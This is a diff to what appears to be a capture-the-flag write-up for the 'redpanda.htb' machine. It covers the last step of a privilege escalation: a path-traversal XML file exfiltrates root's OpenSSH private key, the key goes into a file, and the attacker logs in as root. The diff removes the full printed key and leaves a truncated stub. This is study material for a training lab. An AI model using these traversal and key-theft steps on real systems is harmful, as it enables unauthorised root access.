@@ -192,18 +192,14 @@ cat /tmp/gg_creds.xml
     <uri>/../../../../../../tmp/pe_exploit.jpg</uri>
     <views>2</views>
     <foo>-----BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
-ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
-AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
-RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
+b3BlbnNza...cut...mVkcGFuZGE=
 -----END OPENSSH PRIVATE KEY-----</foo>
   </image>
   <totalviews>3</totalviews>
 </credits>
 ```
 
-Put the `foo` element into s file `le_key.txt` and login as root
+Put the `foo` element value into a file `le_key.txt` and login as root
 ```
 chmod 600 ./le_key.txt
 ssh root@redpanda.htb -i le_key.txt
